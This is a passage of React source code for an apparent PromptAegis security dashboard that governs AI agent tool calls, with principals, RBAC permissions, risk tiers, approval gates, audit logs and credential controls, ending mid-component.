import { useEffect, useState, useMemo, useCallback } from 'react'
import { useSearchParams } from 'react-router-dom'
import { PageHeader } from './Playground'
import { api, DEFAULT_ENV_TOKENS } from '../api'

// ─── Dual-Plane Navigation Definition ───────────────────────────────────────

const PLANES = {
  POSTURE: {
    id: 'POSTURE',
    label: 'PLANE A: POSTURE & ACCESS BOUNDARY',
    subtabs: [
      { id: 'OVERVIEW', label: 'Overview', icon: '📊', desc: 'Global execution boundary posture' },
      { id: 'PRINCIPALS', label: 'Principals', icon: '👤', desc: 'Agent identities, scopes & effective access' },
      { id: 'CAPABILITIES', label: 'Capabilities', icon: '⚙', desc: 'Tool risk tiers, rate limits & approval gates' },
      { id: 'INVARIANTS', label: 'Invariants', icon: '📜', desc: 'Parameter rules & role invariants' },
    ],
  },
  RUNTIME: {
    id: 'RUNTIME',
    label: 'PLANE B: RUNTIME ENFORCEMENT',
    subtabs: [
      { id: 'INVOCATIONS', label: 'Runtime Events', icon: '📋', desc: 'Recent mediated tool proposals & gateway decisions' },
      { id: 'TRACE', label: 'Decision Trace', icon: '🔍', desc: 'Forensic evaluation trace & structured audit log' },
      { id: 'LAB', label: 'Verification Lab', icon: '🔬', desc: 'Isolated policy & boundary testing surface' },
    ],
  },
}

// ─── Semantic Decision & Status Badges ───────────────────────────────────────

function DecisionBadge({ decision }) {
  const d = (decision || '').toUpperCase()
  let label = d || 'UNKNOWN'
  let color = 'gray'

  if (d === 'ALLOW' || d === 'PASS' || d === 'ALLOWED') {
    label = 'ALLOW'
    color = 'green'
  } else if (d === 'BLOCK' || d === 'DENY' || d === 'BLOCKED' || d === 'DENIED') {
    label = 'BLOCK'
    color = 'red'
  } else if (d === 'REQUIRE_APPROVAL') {
    label = 'REQUIRE_APPROVAL'
    color = 'yellow'
  } else if (d === 'RATE_LIMIT') {
    label = 'RATE_LIMIT'
    color = 'cyan'
  }

  const map = {
    green: { background: 'rgba(74, 222, 128, 0.12)', color: 'var(--tier-safe, #4ade80)', border: '1px solid rgba(74, 222, 128, 0.35)' },
    yellow: { background: 'rgba(245, 185, 66, 0.14)', color: 'var(--tier-medium, #facc15)', border: '1px solid rgba(245, 185, 66, 0.35)' },
    red: { background: 'rgba(255, 92, 92, 0.14)', color: 'var(--tier-high, #f87171)', border: '1px solid rgba(255, 92, 92, 0.35)' },
    cyan: { background: 'rgba(69, 217, 196, 0.14)', color: 'var(--signal, #45D9C4)', border: '1px solid rgba(69, 217, 196, 0.35)' },
    gray: { background: 'var(--surface-raised, #1A222D)', color: 'var(--text-muted, #8A97A8)', border: '1px solid var(--border, #232E3B)' },
  }

  return (
    <span style={{ ...styles.badge, ...(map[color] || map.gray) }}>
      <span style={{ ...styles.badgeDot, background: (map[color] || map.gray).color }} />
      {label}
    </span>
  )
}

function RiskTierBadge({ level }) {
  const l = (level || 'low').toLowerCase()
  let bg = 'rgba(74, 222, 128, 0.12)'
  let color = 'var(--tier-safe, #4ade80)'
  if (l === 'high' || l === 'critical') {
    bg = 'rgba(255, 92, 92, 0.14)'
    color = 'var(--tier-high, #f87171)'
  } else if (l === 'medium') {
    bg = 'rgba(245, 185, 66, 0.14)'
    color = 'var(--tier-medium, #facc15)'
  }

  return (
    <span style={{ ...styles.smallBadge, background: bg, color }}>
      {l.toUpperCase()} RISK
    </span>
  )
}

function RoleScopeBadge({ role }) {
  const r = (role || 'default').toLowerCase()
  let bg = 'rgba(125, 211, 252, 0.12)'
  let color = '#7DD3FC'
  if (r === 'admin') {
    bg = 'rgba(245, 185, 66, 0.15)'
    color = '#facc15'
  } else if (r === 'baseline') {
    bg = 'rgba(255, 92, 92, 0.12)'
    color = '#f87171'
  }

  return (
    <span style={{ ...styles.smallBadge, background: bg, color, fontFamily: 'var(--font-mono)' }}>
      role: {role}
    </span>
  )
}

function Spinner() {
  return <span style={styles.spinner}>⟳</span>
}

function EmptyStateCard({ icon = 'ℹ️', title, subtitle, actionLabel, onAction }) {
  return (
    <div style={styles.emptyStateBox}>
      <div style={styles.emptyStateIcon}>{icon}</div>
      <div style={styles.emptyStateTitle}>{title}</div>
      <div style={styles.emptyStateSub}>{subtitle}</div>
      {actionLabel && onAction && (
        <button style={styles.primaryActionBtn} onClick={onAction}>
          {actionLabel}
        </button>
      )}
    </div>
  )
}

// ─── Reference Monitor Pipeline Flow ────────────────────────────────────────

function SecurityPipelineDiagram({ activeStage, decision }) {
  const stages = [
    { id: 'rate_limiter', label: '1. Rate Limiter', sub: '60s fixed window', color: 'var(--signal)' },
    { id: 'permission_engine', label: '2. RBAC Gate', sub: 'Default-deny matrix', color: '#7DD3FC' },
    { id: 'policy_engine', label: '3. Parameter Policy', sub: 'Invariant validation', color: '#F5B942' },
    { id: 'risk_scorer', label: '4. Risk / Approval', sub: 'Score ≥ 7.0 halts', color: '#FF5C5C' },
    { id: 'audit', label: '5. Structured Audit Log', sub: 'SQLite ledger', color: '#A78BFA' },
    { id: 'execution', label: 'Concrete Execution', sub: 'Host invocation', color: 'var(--tier-safe)' },
  ]

  return (
    <div style={styles.pipelineWrap}>
      <div style={styles.pipelineHeader}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
          <span style={{ fontSize: 16 }}>🛡</span>
          <span style={styles.pipelineHeading}>PromptAegis Reference Monitor Sequential Execution Pipeline</span>
        </div>
        <span style={styles.pipelineSub}>
          Sequential mediation: structured agent proposals are verified before concrete host dispatch
        </span>
      </div>

      <div style={styles.pipelineSteps}>
        {stages.map((st, i) => {
          const isBlocked = activeStage === st.id && decision && decision !== 'ALLOW'
          const isPassed = activeStage && activeStage !== st.id

          return (
            <div key={st.id} style={styles.pipelineStepItem}>
              <div
                style={{
                  ...styles.pipelineStepBox,
                  borderColor: isBlocked ? 'var(--tier-high)' : isPassed ? st.color : 'var(--border)',
                  background: isBlocked ? 'rgba(255, 92, 92, 0.12)' : 'var(--surface-raised)',
                }}
              >
                <div style={{ ...styles.pipelineStepTitle, color: isBlocked ? 'var(--tier-high)' : st.color }}>
                  {st.label}
                </div>
                <div style={styles.pipelineStepSub}>{st.sub}</div>
              </div>
              {i < stages.length - 1 && <span style={styles.pipelineArrow}>→</span>}
            </div>
          )
        })}
      </div>
    </div>
  )
}

// ─── ENVIRONMENT CONTEXT BAR (EXPLICIT WORKSPACE SELECTOR) ──────────────────

function EnvironmentContextBar({
  environments,
  currentEnv,
  currentContext,
  authError,
  onSelectEnv,
  onManageCreds,
  onRefresh,
  onSeedBenchmark,
  seeding,
  seedMsg,
  seedError,
}) {
  const envObj = environments.find((e) => e.id === currentEnv) || {
    id: currentEnv,
    name: currentEnv,
    type: currentEnv,
  }

  const isBenchmark = currentEnv === 'research_benchmark'
  const isLocal = currentEnv === 'local_dev'
  const isConnected = currentEnv === 'connected_application'

  return (
    <div style={styles.envBarContainer}>
      <div style={styles.envBarTop}>
        {/* Left: Environment Dropdown & Meta */}
        <div style={styles.envSelectorGroup}>
          <span style={styles.envLabelText}>ENVIRONMENT / WORKSPACE:</span>
          <select
            style={styles.envSelect}
            value={currentEnv}
            onChange={(e) => onSelectEnv(e.target.value)}
          >
            {environments.map((env) => (
              <option key={env.id} value={env.id}>
                {env.name} ({env.id})
              </option>
            ))}
          </select>

          {isBenchmark && (
            <span style={styles.envBenchmarkTag}>
              EVALUATION ENVIRONMENT • HISTORICAL BENCHMARK EVIDENCE (50,910 ROWS)
            </span>
          )}
          {isLocal && (
            <span style={styles.envLocalTag}>
              LOCAL DEV SANDBOX • ISOLATED SCRATCHPAD
            </span>
          )}
          {isConnected && (
            <span style={styles.envConnectedTag}>
              CONNECTED APPLICATION • LIVE GATEWAY RUNTIME
            </span>
          )}
        </div>

        {/* Right: Auth info & Actions */}
        <div style={styles.envActionsGroup}>
          <div style={styles.envCredentialStatus}>
            <span style={{
              ...styles.authDot,
              background: currentContext?.role === 'admin'
                ? '#38BDF8'
                : (['developer', 'benchmark_runner'].includes(currentContext?.role) ? 'var(--tier-safe)' : 'var(--tier-medium)')
            }} />
            <span style={{
              ...styles.authRoleText,
              fontWeight: 700,
              letterSpacing: '0.04em',
              color: currentContext?.role === 'admin'
                ? '#38BDF8'
                : (['developer', 'benchmark_runner'].includes(currentContext?.role) ? 'var(--tier-safe)' : 'var(--text-muted)')
            }}>
              {currentContext?.role === 'admin'
                ? 'ROLE: ADMIN'
                : (['developer', 'benchmark_runner'].includes(currentContext?.role) ? 'ROLE: GOVERNANCE WRITE' : 'ROLE: READ ACCESS')}
            </span>
          </div>

          <button style={styles.envActionBtn} onClick={onManageCreds} title="Inspect or change API credential">
            🔑 Credential & Boundary Controls
          </button>

          <button style={styles.envActionBtn} onClick={onRefresh} title="Reload environment state from backend">
            ⟳ Refresh
          </button>

          {isBenchmark && (
            <button
              style={styles.seedBtn}
              onClick={onSeedBenchmark}
              disabled={seeding}
              title="Reset synthetic benchmark dataset for evaluation"
            >
              {seeding ? '⟳ Resetting…' : '⚡ Load Benchmark Defaults'}
            </button>
          )}
        </div>
      </div>

      {/* Benchmark-specific Seed Feedback */}
      {seedMsg && <div style={styles.seedSuccessMsg}>✓ {seedMsg}</div>}
      {seedError && <div style={styles.seedErrorMsg}>⚠ {seedError}</div>}

      {/* Explicit Authorization Failure Banner */}
      {authError && (
        <div style={styles.authErrorBanner}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <span style={{ fontSize: 18 }}>🛑</span>
            <div>
              <div style={styles.authErrorTitle}>
                REFERENCE MONITOR ACCESS CONTROL REJECTION (HTTP {authError.status || 'AUTH_ERROR'})
              </div>
              <div style={styles.authErrorDetail}>
                {authError.detail || authError.message}
              </div>
            </div>
          </div>
          <button style={styles.authErrorFixBtn} onClick={onManageCreds}>
            Switch to Bound Key for {currentEnv}
          </button>
        </div>
      )}
    </div>
  )
}

// ─── CREDENTIAL & AUTHENTICATION MODAL ──────────────────────────────────────

function CredentialModal({
  isOpen,
  onClose,
  currentEnv,
  currentContext,
  onApplyToken,
  onSimulateUnauthenticated,
  onSimulateSpoof,
  onResetDefault,
}) {
  const currentToken = api.getToken()
  const [tokenInput, setTokenInput] = useState('')

  if (!isOpen) return null

  const handleSave = () => {
    if (tokenInput.trim()) {
      onApplyToken(currentEnv, tokenInput.trim())
    }
    onClose()
  }

  const role = currentContext?.role || (currentContext?.credential_info?.allowed_roles?.[0] || 'default')

  return (
    <div style={styles.modalBackdrop}>
      <div style={{ ...styles.modalBox, maxWidth: 580 }}>
        <div style={styles.modalHeader}>
          <div>
            <div style={styles.modalTitle}>API Credential & Boundary Controls</div>
            <div style={{ fontSize: 11.5, color: 'var(--text-muted)', marginTop: 2 }}>
              Environment identity is bound to cryptographic API credentials in the backend.
            </div>
          </div>
          <button style={styles.modalCloseBtn} onClick={onClose}>✕</button>
        </div>

        <div style={styles.modalForm}>
          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Credential</label>
            <div style={styles.staticFieldMono}>{api.maskCredential(currentToken)}</div>
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Bound Environment</label>
            <div style={styles.staticFieldMono}>{currentEnv}</div>
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Authorization Role</label>
            <div style={styles.staticFieldMono}>{role.toUpperCase()}</div>
          </div>

          <div style={styles.formGroup}>
            <label style={styles.formLabel}>Update API Credential Token (Masked)</label>
            <input
              type="password"
              style={{ ...styles.input, fontFamily: 'var(--font-mono)' }}
              value={tokenInput}
              onChange={(e) => setTokenInput(e.target.value)}
              placeholder="Paste new pa_ token to re-bind..."
            />
            <span style={{ fontSize: 11, color: 'var(--text-dim)' }}>
              Token remains masked for security. Passed via <code>X-PromptAegis-Key</code> or <code>Authorization: Bearer</code>.
            </span>
          </div>

          {/* Negative Testing & Security Proving Controls */}
          <div style={styles.securityTestSection}>
            <div style={styles.secTestTitle}>SECURITY BOUNDARY REGRESSION TESTING:</div>
            <div style={styles.secTestRow}>
              <button
                type="button"
                style={styles.secTestBtn}
                onClick={() => {
                  onSimulateUnauthenticated()
                  onClose()
                }}
                title="Send request with no credentials to verify HTTP 401"
              >
                Test Missing Auth (401)
              </button>

              <button
                type="button"
                style={styles.secTestBtn}
                onClick={() => {
                  onSimulateSpoof(currentEnv)
                  onClose()
                }}
                title="Send mismatched header to verify HTTP 403 Spoof detection"
              >
                Test Header Spoofing (403)
              </button>

              <button
                type="button"
                style={styles.secTestBtnOutline}
                onClick={() => {
                  onResetDefault(currentEnv)
                  onClose()
                }}
              >
                Reset to Bound Default
              </button>
            </div>
          </div>

          <div style={styles.modalFooter}>
            <button type="button" style={styles.cancelBtn} onClick={onClose}>Cancel</button>
            <button
              type="button"
              style={{
                ...styles.primaryActionBtn,
                opacity: tokenInput.trim() ? 1 : 0.5,
                cursor: tokenInput.trim() ? 'pointer' : 'not-allowed',
              }}
              onClick={handleSave}
              disabled={!tokenInput.trim()}
            >
              Save & Re-authenticate
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── SCREEN 1: OVERVIEW (FACTUAL POSTURE SUMMARY) ───────────────────────────

function OverviewView({ stats, agents, tools, policies, toolCalls, currentEnv, currentContext, onNavigate }) {
  const protectedAgents = agents.filter((a) => a.role !== 'baseline').length
  const baselineAgents = agents.length - protectedAgents

  const highRiskTools = tools.filter((t) => t.risk_level === 'high').length
  const approvalRequiredTools = tools.filter((t) => t.requires_approval).length
  const activePoliciesCount = policies.filter((p) => p.enabled).length

  const decisionsCount = stats?.by_decision || {}
  const totalCalls = stats?.total_tool_calls ?? toolCalls.length
  const allowCount = decisionsCount['ALLOW'] || toolCalls.filter((c) => c.decision === 'ALLOW').length
  const blockCount = (decisionsCount['DENY'] || 0) + toolCalls.filter((c) => c.decision === 'DENY' || c.decision === 'BLOCK').length
  const approvalCount = (decisionsCount['REQUIRE_APPROVAL'] || 0) + toolCalls.filter((c) => c.decision === 'REQUIRE_APPROVAL').length
  const rateLimitCount = (decisionsCount['RATE_LIMIT'] || 0) + toolCalls.filter((c) => c.decision === 'RATE_LIMIT').length

  const recentCalls = toolCalls.slice(0, 8)
  const isCompletelyEmpty = agents.length === 0 && tools.length === 0 && policies.length === 0 && totalCalls === 0

  return (
    <div>
      {/* Metric Cards Grid - Strictly Factual Numbers */}
      <div style={styles.metricsGrid}>
        <div style={styles.metricCard} onClick={() => onNavigate('PRINCIPALS')}>
          <div style={styles.metricLabel}>REGISTERED PRINCIPALS</div>
          <div style={styles.metricValueLarge}>{agents.length}</div>
          <div style={styles.metricDetail}>
            <span style={{ color: 'var(--tier-safe)' }}>{protectedAgents} Monitored</span>
            <span style={{ margin: '0 4px', color: 'var(--border)' }}>•</span>
            <span style={{ color: 'var(--tier-high)' }}>{baselineAgents} Baseline</span>
          </div>
        </div>

        <div style={styles.metricCard} onClick={() => onNavigate('CAPABILITIES')}>
          <div style={styles.metricLabel}>EXPOSED CAPABILITIES (TOOLS)</div>
          <div style={styles.metricValueLarge}>{tools.length}</div>
          <div style={styles.metricDetail}>
            <span style={{ color: 'var(--tier-high)' }}>{highRiskTools} High-Risk</span>
            <span style={{ margin: '0 4px', color: 'var(--border)' }}>•</span>
            <span style={{ color: 'var(--tier-medium)' }}>{approvalRequiredTools} Approval Required</span>
          </div>
        </div>

        <div style={styles.metricCard} onClick={() => onNavigate('INVARIANTS')}>
          <div style={styles.metricLabel}>ACTIVE INVARIANTS (POLICIES)</div>
          <div style={styles.metricValueLarge}>{activePoliciesCount}</div>
          <div style={styles.metricDetail}>
            <span style={{ color: 'var(--text-muted)' }}>Constraining argument mutations</span>
          </div>
        </div>

        <div style={styles.metricCard} onClick={() => onNavigate('INVOCATIONS')}>
          <div style={styles.metricLabel}>GATEWAY DECISIONS (AUDIT LOG)</div>
          <div style={styles.metricValueLarge}>{totalCalls}</div>
          <div style={styles.metricDetail}>
            <span style={{ color: 'var(--tier-safe)' }}>{allowCount} Allow</span>
            <span style={{ margin: '0 4px', color: 'var(--border)' }}>•</span>
            <span style={{ color: 'var(--tier-high)' }}>{blockCount} Block</span>
            <span style={{ margin: '0 4px', color: 'var(--border)' }}>•</span>
            <span style={{ color: 'var(--tier-medium)' }}>{approvalCount} Appr.</span>
            <span style={{ margin: '0 4px', color: 'var(--border)' }}>•</span>
            <span style={{ color: 'var(--signal)' }}>{rateLimitCount} Rate-Lim</span>
          </div>
        </div>
      </div>

      {isCompletelyEmpty && (
        <div style={styles.emptyEnvironmentCallout}>
          <div style={{ fontWeight: 700, fontSize: 13, marginBottom: 4 }}>
            EMPTY ENVIRONMENT POSTURE: {currentEnv.toUpperCase()}
          </div>
          <div style={{ fontSize: 12, color: 'var(--text-muted)' }}>
            This environment is completely unconfigured. No principals, tools, or invariants have been registered yet.
            Use the management tabs in Plane A to configure your access boundary or route external proposals to <code>POST /intercept</code>.
          </div>
        </div>
      )}

      {/* Security Posture Summary Row */}
      <div style={styles.twoColRow}>
        {/* Effective Access Posture */}
        <div style={styles.cardPanel}>
          <div style={styles.panelTitleRow}>
            <div>
              <div style={styles.panelHeading}>Access Boundary by Principal Scope</div>
              <div style={styles.panelSub}>Default-deny RBAC permissions assigned to each agent identity</div>
            </div>
            <button style={styles.smallOutlineBtn} onClick={() => onNavigate('PRINCIPALS')}>
              Manage Principals →
            </button>
          </div>

          <div style={styles.tableWrapCompact}>
            <table style={styles.table}>
              <thead>
                <tr>
                  <th style={styles.th}>Principal</th>
                  <th style={styles.th}>Scope Role</th>
                  <th style={styles.th}>Enforcement Posture</th>
                  <th style={styles.th}>Rate-Limit (60s Fixed/Tumbling Window)</th>
                </tr>
              </thead>
              <tbody>
                {agents.length === 0 ? (
                  <tr>
                    <td colSpan={4} style={styles.tdCenter}>
                      No principals registered in this environment.
                    </td>
                  </tr>
                ) : (
                  agents.map((a) => (
                    <tr key={a.agent_id} style={styles.tr}>
                      <td style={{ ...styles.td, fontWeight: 600 }}>{a.name}</td>
                      <td style={styles.td}><RoleScopeBadge role={a.role} /></td>
                      <td style={styles.td}>
                        {a.role === 'baseline' ? (
                          <span style={{ ...styles.badge, background: 'rgba(255, 92, 92, 0.1)', color: 'var(--tier-high)' }}>UNGOVERNED</span>
                        ) : (
                          <span style={{ ...styles.badge, background: 'rgba(74, 222, 128, 0.1)', color: 'var(--tier-safe)' }}>REFERENCE MONITOR</span>
                        )}
                      </td>
                      <td style={{ ...styles.td, ...styles.mono, fontSize: 11.5, color: 'var(--text-muted)' }}>
                        60s fixed window per tool
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Recent Gateway Interceptions */}
        <div style={styles.cardPanel}>
          <div style={styles.panelTitleRow}>
            <div>
              <div style={styles.panelHeading}>Recent Gateway Decisions</div>
              <div style={styles.panelSub}>Latest decisions arbitrated by the post-generation reference monitor</div>
            </div>
            <button style={styles.smallOutlineBtn} onClick={() => onNavigate('INVOCATIONS')}>
              Runtime Events →
            </button>
          </div>

          <div style={styles.tableWrapCompact}>
            <table style={styles.table}>
              <thead>
                <tr>
                  <th style={styles.th}>Principal</th>
                  <th style={styles.th}>Capability</th>
                  <th style={styles.th}>Decision</th>
                  <th style={styles.th}>Enforcement Reason</th>
                </tr>
              </thead>
              <tbody>
                {recentCalls.length === 0 ? (
                  <tr>
                    <td colSpan={4} style={styles.tdCenter}>
                      No runtime proposals intercepted in this environment yet.
                    </td>
                  </tr>
                ) : (
                  recentCalls.map((c) => (
                    <tr key={c.call_id} style={styles.tr}>
                      <td style={{ ...styles.td, ...styles.mono, fontSize: 12 }}>{c.agent_id}</td>
                      <td style={{ ...styles.td, ...styles.mono, fontSize: 12 }}>{c.tool_name}</td>
                      <td style={styles.td}><DecisionBadge decision={c.decision} /></td>
                      <td style={{ ...styles.td, fontSize: 11.5, color: 'var(--text-muted)' }}>
                        {c.reason}
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── SCREEN 2: PRINCIPALS (AGENTS AS SECURITY PRINCIPALS) ───────────────────

function PrincipalsView({
  agents,
  tools,
  policies,
  toolCalls,
  onSelectAgent,
  onRefresh,
  loading,
  currentEnv,
}) {
  const [search, setSearch] = useState('')
  const [filterRole, setFilterRole] = useState('ALL')
  const [showAddModal, setShowAddModal] = useState(false)
  const [newAgent, setNewAgent] = useState({ name: '', description: '', role: 'support' })
  const [saving, setSaving] = useState(false)
  const [error, setError] = useState(null)

  const filteredPrincipals = useMemo(() => {
    return agents.filter((a) => {
      if (filterRole !== 'ALL' && a.role !== filterRole) return false
      if (search) {
        const s = search.toLowerCase()
        if (!a.name.toLowerCase().includes(s) && !a.agent_id.toLowerCase().includes(s)) {
          return false
        }
      }
      return true
    })
  }, [agents, filterRole, search])

  const handleAddAgent = async (e) => {
    e.preventDefault()
    if (!newAgent.name.trim()) return
    setSaving(true)
    setError(null)
    try {
      await api.createAgent(newAgent.name.trim(), newAgent.description.trim(), newAgent.role)
      setShowAddModal(false)
      setNewAgent({ name: '', description: '', role: 'support' })
      if (onRefresh) await onRefresh()
    } catch (err) {
      setError(err.message)
    } finally {
      setSaving(false)
    }
  }

  return (
    <div>
      <div style={styles.viewControlsBar}>
        <div style={{ display: 'flex', gap: 10, alignItems: 'center' }}>
          <input
            style={styles.searchInput}
            placeholder="Search principals by name or ID…"
            value={search}
            onChange={(e) => setSearch(e.target.value)}
          />
          <div style={styles.roleFilterGroup}>
            {['ALL', 'support', 'admin', 'baseline'].map((r) => (
              <button
                key={r}
                style={{
                  ...styles.filterChip,
                  ...(filterRole === r ? styles.filterChipActive : {}),
                }}
                onClick={() => setFilterRole(r)}
              >
                {r.toUpperCase()}
              </button>
            ))}
          </div>
        </div>

        <button style={styles.primaryActionBtn} onClick={() => setShowAddModal(true)}>
          + Register Principal Definition
        </button>
      </div>

      {loading && (
        <div style={styles.emptyState}>
          <Spinner /> Loading principals…
        </div>
      )}

      {/* Honest Empty State */}
      {!loading && filteredPrincipals.length === 0 && (
        <EmptyStateCard
          icon="👤"
          title="NO PRINCIPALS REGISTERED"
          subtitle={
            agents.length === 0
              ? `No AI agent identities exist in this environment (${currentEnv}). Register a principal to define its role and configure RBAC permissions.`
              : 'No principals match the current search or role filters.'
          }
          actionLabel={agents.length === 0 ? '+ Register First Principal' : null}
          onAction={() => setShowAddModal(true)}
        />
      )}

      {/* Principals Grid */}
      <div style={styles.principalsGrid}>
        {filteredPrincipals.map((principal) => {
          const isBaseline = principal.role === 'baseline'

          return (
            <div
              key={principal.agent_id}
              style={{
                ...styles.principalCard,
                ...(isBaseline ? styles.principalCardBaseline : {}),
              }}
              onClick={() => onSelectAgent(principal)}
            >
              <div>
                <div style={styles.principalCardHeader}>
                  <div>
                    <div style={styles.principalName}>{principal.name}</div>
                    <div style={styles.principalIdMono}>ID: {principal.agent_id}</div>
                  </div>
                  <RoleScopeBadge role={principal.role} />
                </div>

                <div style={styles.principalDesc}>
                  {principal.description || 'No description provided.'}
                </div>
              </div>

              <div>
                <div style={styles.exposureSummaryBox}>
                  <div style={styles.exposureRow}>
                    <span style={styles.exposureLabel}>EXECUTION POSTURE</span>
                    <span style={{ ...styles.exposureVal, color: isBaseline ? 'var(--tier-high)' : 'var(--tier-safe)' }}>
                      {isBaseline ? 'UNGOVERNED BASELINE' : 'REFERENCE MONITOR'}
                    </span>
                  </div>
                  <div style={styles.exposureRow}>
                    <span style={styles.exposureLabel}>RATE LIMIT QUOTA</span>
                    <span style={{ ...styles.exposureVal, fontFamily: 'var(--font-mono)' }}>60s fixed window</span>
                  </div>
                </div>

                <div style={styles.principalCardFooter}>
                  <span style={styles.inspectProfileLink}>Inspect Permissions & Audit Trace →</span>
                </div>
              </div>
            </div>
          )
        })}
      </div>

      {/* Register Principal Modal */}
      {showAddModal && (
        <div style={styles.modalBackdrop}>
          <div style={styles.modalBox}>
            <div style={styles.modalHeader}>
              <div style={styles.modalTitle}>Register Principal Definition</div>
              <button style={styles.modalCloseBtn} onClick={() => setShowAddModal(false)}>✕</button>
            </div>

            <form onSubmit={handleAddAgent} style={styles.modalForm}>
              {error && <div style={styles.errorMsg}>{error}</div>}

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Principal Name *</label>
                <input
                  style={styles.input}
                  placeholder="e.g. customer_support_agent"
                  value={newAgent.name}
                  onChange={(e) => setNewAgent({ ...newAgent, name: e.target.value })}
                  required
                />
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Role Assignment</label>
                <select
                  style={styles.select}
                  value={newAgent.role}
                  onChange={(e) => setNewAgent({ ...newAgent, role: e.target.value })}
                >
                  <option value="support">support (Restricted Access)</option>
                  <option value="admin">admin (Elevated Access)</option>
                  <option value="baseline">baseline (Ungoverned Control Group)</option>
                </select>
              </div>

              <div style={styles.formGroup}>
                <label style={styles.formLabel}>Description</label>
                <input
                  style={styles.input}
                  placeholder="Principal purpose and agent scope"
                  value={newAgent.description}
                  onChange={(e) => setNewAgent({ ...newAgent, description: e.target.value })}
                />
              </div>

              <div style={styles.modalFooter}>
                <button type="button" style={styles.cancelBtn} onClick={() => setShowAddModal(false)}>Cancel</button>
                <button type="submit" style={styles.primaryActionBtn} disabled={saving}>
                  {saving ? 'Registering…' : 'Register Principal'}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  )
}

// ─── PRINCIPAL PROFILE (INSPECT PERMISSIONS & EFFECTIVE ACCESS) ─────────────

function PrincipalProfileView({ principal, tools, policies, toolCalls, onBack, onTestInLab, onRefresh }) {
  const [permissions, setPermissions] = useState([])
  const [loadingPerms, setLoadingPerms] = useState(true)
  const [toggling, setToggling] = useState(null)

  const loadPerms = useCallback(async () => {
    setLoadingPerms(true)
    try {
      const res = await api.getPermissions(principal.agent_id)
      setPermissions(res?.permissions || res || [])
    } catch {
      setPermissions([])
    } finally {
      setLoadingPerms(false)
    }
  }, [principal.agent_id])

  useEffect(() => {
    loadPerms()
  }, [loadPerms])

  const handleTogglePerm = async (toolId, currentAllowed) => {
    setToggling(toolId)
    try {
      await api.setPermission(principal.agent_id, toolId, !currentAllowed)
      await loadPerms()
      if (onRefresh) onRefresh()
    } catch (err) {
      alert(`Error updating permission: ${err.message}`)
    } finally {
      setToggling(null)
    }
  }

  const agentCalls = useMemo(() => {
    return toolCalls.filter((c) => c.agent_id === principal.agent_id)
  }, [toolCalls, principal.agent_id])

  return (
    <div>
      <div style={styles.profileHeaderNav}>
        <button style={styles.backBtn} onClick={onBack}>
          ← Back to Principals
        </button>
        <div style={styles.profileNavTitle}>
          Principal Inspection: <span style={styles.profileNavAgentName}>{principal.name}</span>
        </div>
      </div>

      <div style={styles.profileHeroCard}>
        <div style={styles.profileHeroTop}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
              <h2 style={styles.profileHeroName}>{principal.name}</h2>
              <RoleScopeBadge role={principal.role} />
            </div>
            <div style={styles.profileHeroMono}>Principal ID: {principal.agent_id}</div>
            <div style={styles.profileHeroDesc}>{principal.description || 'No description.'}</div>
          </div>
          <button style={styles.heroConsoleBtn} onClick={() => onTestInLab(principal)}>
            🔬 Test In Verification Lab →
          </button>
        </div>

        <div style={styles.factualExposureStrip}>
          <div style={styles.exposureStripCell}>
            <div style={styles.exposureStripLabel}>REFERENCE MONITOR ENFORCEMENT</div>
            <div style={{ ...styles.exposureStripVal, color: principal.role === 'baseline' ? 'var(--tier-high)' : 'var(--tier-safe)' }}>
              {principal.role === 'baseline' ? 'BYPASSED (Baseline)' : 'ACTIVE (Default-Deny)'}
            </div>
          </div>
          <div style={styles.exposureStripCell}>
            <div style={styles.exposureStripLabel}>ASSIGNED CAPABILITIES</div>
            <div style={styles.exposureStripVal}>
              {permissions.filter((p) => p.allowed).length} of {tools.length} Tools
            </div>
          </div>
          <div style={styles.exposureStripCell}>
            <div style={styles.exposureStripLabel}>RECORDED INVOCATIONS</div>
            <div style={styles.exposureStripVal}>{agentCalls.length}</div>
          </div>
        </div>
      </div>

      {/* RBAC Capability Permissions Matrix */}
      <div style={styles.cardPanel}>
        <div style={styles.panelTitleRow}>
          <div>
            <div style={styles.panelHeading}>Capability Access Permissions (RBAC)</div>
            <div style={styles.panelSub}>Explicit capability authorization for this principal identity</div>
          </div>
        </div>

        {loadingPerms ? (
          <div style={styles.emptyState}><Spinner /> Loading permissions…</div>
        ) : (
          <div style={styles.tableWrap}>
            <table style={styles.table}>
              <thead>
                <tr>
                  <th style={styles.th}>Capability (Tool)</th>
                  <th style={styles.th}>Category</th>
                  <th style={styles.th}>Risk Tier</th>
                  <th style={styles.th}>Human Approval Gate</th>
                  <th style={styles.th}>Authorization Status</th>
                  <th style={styles.th}>Action</th>
                </tr>
              </thead>
              <tbody>
                {tools.length === 0 ? (
                  <tr><td colSpan={6} style={styles.tdCenter}>No tools registered in this environment.</td></tr>
                ) : (
                  tools.map((tool) => {
                    const perm = permissions.find((p) => p.tool_id === tool.tool_id)
                    const isAllowed = perm ? perm.allowed : false
                    const isBusy = toggling === tool.tool_id

                    return (
                      <tr key={tool.tool_id} style={styles.tr}>
                        <td style={{ ...styles.td, ...styles.mono, fontWeight: 700 }}>{tool.name}</td>
                        <td style={styles.td}>{tool.category}</td>
                        <td style={styles.td}><RiskTierBadge level={tool.risk_level} /></td>
                        <td style={styles.td}>
                          {tool.requires_approval ? (
                            <span style={{ color: 'var(--tier-medium)', fontSize: 11.5 }}>Required</span>
                          ) : (
                            <span style={{ color: 'var(--text-dim)', fontSize: 11.5 }}>Automatic</span>
                          )}
                        </td>
                        <td style={styles.td}>
                          {isAllowed ? (
                            <span style={{ ...styles.badge, background: 'rgba(74, 222, 128, 0.12)', color: 'var(--tier-safe)' }}>
                              PERMITTED
                            </span>
                          ) : (
